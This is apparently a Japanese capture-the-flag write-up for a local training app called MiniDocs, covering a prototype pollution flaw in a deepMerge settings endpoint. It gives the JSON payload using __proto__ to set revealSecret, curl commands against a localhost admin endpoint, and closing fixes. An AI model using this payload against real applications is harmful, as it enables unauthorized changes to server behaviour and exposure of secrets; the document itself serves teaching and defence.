# MiniDocs — Prototype Pollution

## 解法

### 1) `admin`から管理者画面へ
- **前提**：管理者でログイン済み（IDOR で入手したパスワードを使用）。
- **URL欄**：`http://127.0.0.1:8000/admin`
- 管理画面中部 **「設定変更」** に `patch (JSON)` テキストエリアと **Apply** ボタンがある。

### 2) ヒント
- **bob の勉強メモ**（例：`doc-bo-0002` *「勉強メモ: 配列のマージ処理」*）に **deep merge（deepmerge）** という語が登場し、
  さらに `doc-bo-0004` *「勉強メモ: 機能フラグの管理」* で **`featureFlags` というトップレベルキー**が示唆される。
- **admin の運用メモ**（例：`doc-ad-0002` *「設定っぽいもの」*）には、**画面から設定を入れる**旨と
  **`{"limits":{"maxDoc":100}}` のような JSON 例**が書かれている。
- 管理者画面の**「現在の設定」**にavailableFeatureFlagsに複数使用できる設定があり、その中に**revealSecret**がある。
  Secretとあるので使用怪しい。
- これらから、**設定の“パッチ”は JSON で送り、受理されるルートは `limits` / `featureFlags`** と推測できる。
  ただし **`revealSecret` は UI からは直接いじれない**（＝“システム専用”らしい）ため、**別の経路（PP）**が必要だと分かる。

### 3) 送信ペイロード
```json
{"featureFlags":{"__proto__":{"revealSecret":true}}}
```
- **狙い**：脆弱な `deepMerge` が **`__proto__` をそのまま潜る**ため、`Object.prototype.revealSecret = true` が汚染される。 

### 4) 送信後の画面変化と `<FLAG_PP>` の確認箇所
1. 管理画面下部 **「現在の設定」** の内容に注目：  
   - `secretPreview` が **`"(hidden)" → "<FLAG_PP>"`** へ変化している。  
   - ここに `<FLAG_PP>` が可視化される。

### つまずきポイント / 代替ルート
- **直接指定は無効**：`{"featureFlags":{"revealSecret":true}}` は受理されても**削除**され効果なし。`__proto__` 経由のみ成功。

---

## 付録：curl 参考（数行）
> 先に **admin** でログインして Cookie を取得しておくこと。フラグの実文字列は表示しない。

```bash
# 1) admin でログイン
curl -s -c c.txt -d 'user=admin&pass=<hidden>' http://127.0.0.1:8000/login > /dev/null

# 2) __proto__ 汚染を JSON で適用（/admin/feature-flags）
curl -s -b c.txt -H 'Content-Type: application/json'   -d '{"featureFlags":{"__proto__":{"revealSecret":true}}}'   http://127.0.0.1:8000/admin/feature-flags > /dev/null

# 3) Diagnostics で secretPreview の露出を確認
curl -s -b c.txt http://127.0.0.1:8000/admin | grep -A2 '"secretPreview"'   # => "<FLAG_PP>"
```

---

## 根本原因と対策（Prototype Pollution）
- **原因**：再帰マージ `deepMerge` が **`__proto__`/`prototype`/`constructor`** を**ブロックせず**に潜るため、`Object.prototype` が汚染される。UI 側も `ownProperty` 判定をせず参照。  
- **対策（最小）**：
  - ① マージ前に **危険キー拒否**（`['__proto__','prototype','constructor']` を除去）。  
  - ② ライブラリ利用時は **proto 汚染無効化オプション**を有効化。  
  - ③ 参照側も **`Object.hasOwn` / `hasOwnProperty`** で自前プロパティのみ採用する二重防御。
